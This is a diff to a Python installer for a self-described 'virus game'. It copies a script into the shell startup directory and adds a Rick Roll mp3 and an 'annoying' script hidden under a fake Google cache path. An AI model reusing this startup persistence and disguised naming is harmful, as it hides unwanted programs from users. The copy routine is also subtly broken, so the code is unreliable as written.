@@ -11,9 +11,9 @@ def copyfile(source, dest):
     if os.path.exists(dest):
         print(f"Failed to copy {source} to {dest}:\n Destination already exists.")
         return
-    with open(source, "r") as f:
+    with open(source, "rb") as f:
         content = f.readlines()
-    with open(dest, "w") as f:
+    with open(dest, "wb") as f:
         f.write(content)
 
 
@@ -33,6 +33,9 @@ if sys.platform == "win32":
 file_table = [
     (f"{curr_location}/src/virus_game_startup.py", f"{shell_startup_dir}/virus_game_startup.py", False),
     # (f"{curr_location}/src/virus_game_startup.py", f"{curr_location}/test/virus_game_startup_copy.py")
+    (f"{curr_location}/src/youtube_com-watch-dQw4w9WgXcQ.mp3", f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3", True),
+    (f"{curr_location}/src/annoying.py", f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py", True),
+    # (f"{curr_location}/src/youtube_com-watch-dQw4w9WgXcQ.mp3", f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3", True)
 ]
 
 for source, dest, makedirs in file_table:
